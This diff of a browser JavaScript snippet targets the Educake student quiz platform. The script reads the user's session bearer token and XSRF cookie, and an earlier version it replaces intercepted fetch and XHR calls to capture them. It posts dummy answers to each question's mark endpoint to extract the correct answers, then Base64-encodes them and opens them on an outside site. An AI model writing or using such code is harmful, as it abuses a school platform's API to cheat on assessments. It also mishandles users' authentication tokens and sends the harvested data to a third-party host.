@@ -1,51 +1,25 @@
-(async function() {
-    // Store the headers
-    let dynamicHeaders = {};
+(async function(){
+    // Get the authorization token from sessionStorage
+    let authToken = sessionStorage.getItem("token");
 
-    // Function to intercept and log requests with Authorization header
-    const interceptRequests = (url, options) => {
-        // Check if Authorization header exists in the request
-        if (options?.headers?.authorization) {
-            dynamicHeaders = options.headers; // Store headers for later use
-            console.log("Authorization header found:", dynamicHeaders);
-            return true;
-        }
-        return false;
-    };
+    // Function to get XSRF-TOKEN from cookies
+    function getXsrfToken() {
+        let match = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
+        return match ? decodeURIComponent(match[1]) : null;
+    }
+    let xsrfToken = getXsrfToken();
 
-    // Intercept fetch requests
-    const originalFetch = window.fetch;
-    window.fetch = async function(url, options) {
-        // Check and capture headers when Authorization is found
-        if (interceptRequests(url, options)) {
-            // Stop intercepting fetch requests once Authorization is found
-            window.fetch = originalFetch;
-        }
+    if (!authToken) {
+        alert("Authorization token not found in sessionStorage. Ensure you're logged in.");
+        return;
+    }
 
-        return originalFetch.apply(this, arguments);
-    };
+    if (!xsrfToken) {
+        alert("XSRF token not found in cookies. Ensure you're logged in.");
+        return;
+    }
 
-    // Intercept XMLHttpRequest (for older API requests)
-    const originalXHR = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url) {
-        const self = this;
-        this.addEventListener("readystatechange", function() {
-            if (this.readyState === 4) {
-                // Check if the response contains the Authorization header
-                const responseHeaders = this.getAllResponseHeaders();
-                if (responseHeaders.includes("Authorization")) {
-                    dynamicHeaders = this.getResponseHeader("Authorization");
-                    console.log("Authorization header found in XHR response:", dynamicHeaders);
-
-                    // Stop intercepting XHR requests once Authorization is found
-                    XMLHttpRequest.prototype.open = originalXHR;
-                }
-            }
-        });
-        originalXHR.apply(this, arguments);
-    };
-
-    // Extract QUIZID from the URL
+    // Extract Quiz ID from URL
     let match = window.location.pathname.match(/quiz\/(\d+)/);
     if (!match) {
         alert("Quiz ID not found in the URL.");
@@ -53,58 +27,68 @@
     }
     let quizId = match[1];
 
+    console.log("Quiz ID:", quizId);
+    console.log("Using Auth Token:", authToken);
+    console.log("Using XSRF Token:", xsrfToken);
+
     try {
-        // Wait for the headers to be captured from the first request
-        await new Promise(resolve => setTimeout(resolve, 1000));  // Adjust wait time if necessary
-
-        if (!dynamicHeaders.authorization) {
-            alert("Authorization token not found. Make sure you've made a request first.");
-            return;
-        }
-
-        // Fetch quiz data using the dynamic headers
+        // Fetch quiz data
         let quizResponse = await fetch(`https://my.educake.co.uk/api/student/quiz/${quizId}`, {
             method: 'GET',
-            headers: dynamicHeaders
+            headers: {
+                'Accept': 'application/json;version=2',
+                'Authorization': `Bearer ${authToken}`,
+                'X-XSRF-TOKEN': xsrfToken
+            }
         });
 
         if (!quizResponse.ok) throw new Error("Failed to fetch quiz data.");
 
         let quizData = await quizResponse.json();
-        let attempt = Object.values(quizData.attempt)[0]; // Get first attempt object
-        if (!attempt || !attempt.questions) {
-            alert("No questions found in the quiz.");
-            return;
-        }
 
-        let questionIds = attempt.questions;
-        console.log(`Found ${questionIds.length} questions. Fetching correct answers...`);
+        // Extract question IDs
+        let questionIds = quizData.attempt[quizId].questions;
+        console.log("Found Question IDs:", questionIds);
 
-        // Send requests for each question using the dynamic headers
+        let answers = [];
+
+        // Fetch correct answers for each question
         for (let questionId of questionIds) {
             try {
-                let questionResponse = await fetch(`https://my.educake.co.uk/api/course/question/${questionId}/mark`, {
+                let response = await fetch(`https://my.educake.co.uk/api/course/question/${questionId}/mark`, {
                     method: 'POST',
-                    headers: dynamicHeaders,
-                    body: JSON.stringify({"givenAnswer": "1"})
+                    headers: {
+                        'Accept': 'application/json;version=2',
+                        'Authorization': `Bearer ${authToken}`,
+                        'X-XSRF-TOKEN': xsrfToken,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ "givenAnswer": "1" }) // Dummy answer to get correct answer
                 });
 
-                let data = await questionResponse.json();
+                let data = await response.json();
 
                 // Check if response contains the correct answer
                 if (data.answer && data.answer.correctAnswers) {
-                    console.log(`Question ${questionId} - Correct Answer:`, data.answer.correctAnswers.join(", "));
+                    let correctAnswer = data.answer.correctAnswers.join(", ");
+                    answers.push({ questionId, correctAnswer });
+                    console.log(`Question ${questionId} - Correct Answer: ${correctAnswer}`);
                 } else {
-                    console.log(`Question ${questionId} - No correct answer found in response.`);
+                    console.log(`Question ${questionId} - No correct answer found.`);
                 }
             } catch (error) {
                 console.error(`Error submitting question ${questionId}:`, error);
             }
         }
 
-        alert("All requests sent. Check console for correct answers.");
+        // Encode answers as Base64 JSON
+        let encodedAnswers = btoa(JSON.stringify(answers));
+
+        // Open new tab with encoded answers
+        let newTabUrl = `https://educake.samj.app/?answers=${encodedAnswers}`;
+        window.open(newTabUrl, "_blank");
+
     } catch (error) {
         console.error("Error:", error);
-        alert("An error occurred. Check the console.");
     }
 })();
